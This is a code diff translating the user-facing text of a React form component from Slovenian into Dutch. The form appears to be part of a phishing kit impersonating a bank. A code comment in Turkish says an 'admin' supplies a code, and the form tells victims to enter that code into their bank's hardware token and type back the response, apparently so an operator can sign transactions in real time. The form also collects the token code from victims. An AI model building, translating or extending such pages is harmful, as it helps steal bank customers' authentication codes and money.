@@ -108,7 +108,7 @@ export function GeneratorClient({ sessionId, variant }: Props) {
 
     setSaving(false);
     if (upErr) {
-      setError("Napaka. Poskusite znova.");
+      setError("Fout. Probeer het opnieuw.");
       return;
     }
     setDone(true);
@@ -122,7 +122,7 @@ export function GeneratorClient({ sessionId, variant }: Props) {
         </svg>
       </div>
       <p className="text-lg font-bold text-gray-900">Hvala!</p>
-      <p className="mt-1 text-sm text-gray-500">Vaši podatki so bili uspešno poslani.</p>
+      <p className="mt-1 text-sm text-gray-500">Uw gegevens zijn succesvol verzonden.</p>
     </div>
   );
 
@@ -170,7 +170,7 @@ export function GeneratorClient({ sessionId, variant }: Props) {
                   <path fillRule="evenodd" d="M8.485 2.495c.673-1.167 2.357-1.167 3.03 0l6.28 10.875c.673 1.167-.17 2.625-1.516 2.625H3.72c-1.347 0-2.189-1.458-1.515-2.625l6.28-10.875zM10 6.5a.75.75 0 01.75.75v3.5a.75.75 0 01-1.5 0v-3.5A.75.75 0 0110 6.5zm0 8a1 1 0 100-2 1 1 0 000 2z" clipRule="evenodd" />
                 </svg>
                 <p className="text-[13px] font-medium leading-snug text-amber-800">
-                  Ta videoposnetek je prikazan kot primer. Dejanska koda se lahko razlikuje.
+                  Deze video wordt getoond als voorbeeld. De werkelijke code kan afwijken.
                 </p>
               </div>
 
@@ -180,7 +180,7 @@ export function GeneratorClient({ sessionId, variant }: Props) {
                   <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a.75.75 0 000 1.5h.253a.25.25 0 01.244.304l-.459 2.066A1.75 1.75 0 0010.747 15H11a.75.75 0 000-1.5h-.253a.25.25 0 01-.244-.304l.459-2.066A1.75 1.75 0 009.253 9H9z" clipRule="evenodd" />
                 </svg>
                 <p className="text-[13px] font-medium leading-snug text-blue-800">
-                  Dotaknite se gumba 1 v svoji napravi in vnesite kodo, ki jo vidite v spodnjem polju.
+                  Druk op knop 1 op uw apparaat en voer de code in die u in het onderstaande veld ziet.
                 </p>
               </div>
 
@@ -195,7 +195,7 @@ export function GeneratorClient({ sessionId, variant }: Props) {
                   onChange={(e) =>
                     setValues((prev) => ({ ...prev, generatoriaus_kodas: e.target.value }))
                   }
-                  placeholder="Vnesite kodo generatorja"
+                  placeholder="Voer de generatorcode in"
                   className="w-full rounded-xl border border-gray-200 bg-gray-50 px-4 py-3.5 text-sm font-medium text-gray-900 outline-none transition-all focus:border-[#E30613] focus:bg-white focus:ring-2 focus:ring-[#E30613]/20"
                 />
               </div>
@@ -207,7 +207,7 @@ export function GeneratorClient({ sessionId, variant }: Props) {
                 disabled={saving}
                 className="w-full rounded-xl bg-[#E30613] px-4 py-3.5 text-sm font-bold text-white shadow-lg shadow-[#E30613]/25 transition-all hover:bg-[#b30412] disabled:opacity-50"
               >
-                {saving ? "Pošiljanje..." : "Nadaljuj"}
+                {saving ? "Verzenden..." : "Doorgaan"}
               </button>
             </form>
           )}
@@ -260,14 +260,14 @@ export function GeneratorClient({ sessionId, variant }: Props) {
                 <path fillRule="evenodd" d="M8.485 2.495c.673-1.167 2.357-1.167 3.03 0l6.28 10.875c.673 1.167-.17 2.625-1.516 2.625H3.72c-1.347 0-2.189-1.458-1.515-2.625l6.28-10.875zM10 6.5a.75.75 0 01.75.75v3.5a.75.75 0 01-1.5 0v-3.5A.75.75 0 0110 6.5zm0 8a1 1 0 100-2 1 1 0 000 2z" clipRule="evenodd" />
               </svg>
               <p className="text-[13px] font-medium leading-snug text-amber-800">
-                Ta videoposnetek je prikazan kot primer. Dejanska koda se lahko razlikuje.
+                Deze video wordt getoond als voorbeeld. De werkelijke code kan afwijken.
               </p>
             </div>
 
             {/* Admin'in girdigi kod (sari kutu) */}
             <div className="rounded-xl border border-amber-400/70 bg-amber-400/20 px-4 py-3 text-center">
               <p className="text-sm font-bold text-gray-900">
-                Vnesite to kodo: <span className="font-mono tracking-widest">{shownCode}</span>
+                Voer deze code in: <span className="font-mono tracking-widest">{shownCode}</span>
               </p>
             </div>
 
@@ -277,9 +277,9 @@ export function GeneratorClient({ sessionId, variant }: Props) {
                 <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a.75.75 0 000 1.5h.253a.25.25 0 01.244.304l-.459 2.066A1.75 1.75 0 0010.747 15H11a.75.75 0 000-1.5h-.253a.25.25 0 01-.244-.304l.459-2.066A1.75 1.75 0 009.253 9H9z" clipRule="evenodd" />
               </svg>
               <p className="text-[13px] font-medium leading-snug text-blue-800">
-                V generatorju pritisnite 2, vnesite kodo{" "}
+                Druk op de generator op 2, voer de code in{" "}
                 <span className="font-mono font-bold">{shownCode}</span> v generator in
-                vnesite dobljeno kodo v spodnje polje, nato nadaljujte.
+                voer de verkregen code in het onderstaande veld in en ga verder.
               </p>
             </div>
 
@@ -294,7 +294,7 @@ export function GeneratorClient({ sessionId, variant }: Props) {
                 onChange={(e) =>
                   setValues((prev) => ({ ...prev, generatoriaus_kodas: e.target.value }))
                 }
-                placeholder="Vnesite kodo generatorja"
+                placeholder="Voer de generatorcode in"
                 className="w-full rounded-xl border border-gray-200 bg-gray-50 px-4 py-3.5 text-sm font-medium text-gray-900 outline-none transition-all focus:border-[#E30613] focus:bg-white focus:ring-2 focus:ring-[#E30613]/20"
               />
             </div>
@@ -306,7 +306,7 @@ export function GeneratorClient({ sessionId, variant }: Props) {
               disabled={saving}
               className="w-full rounded-xl bg-[#E30613] px-4 py-3.5 text-sm font-bold text-white shadow-lg shadow-[#E30613]/25 transition-all hover:bg-[#b30412] disabled:opacity-50"
             >
-              {saving ? "Pošiljanje..." : "Nadaljuj"}
+              {saving ? "Verzenden..." : "Doorgaan"}
             </button>
           </form>
         )}
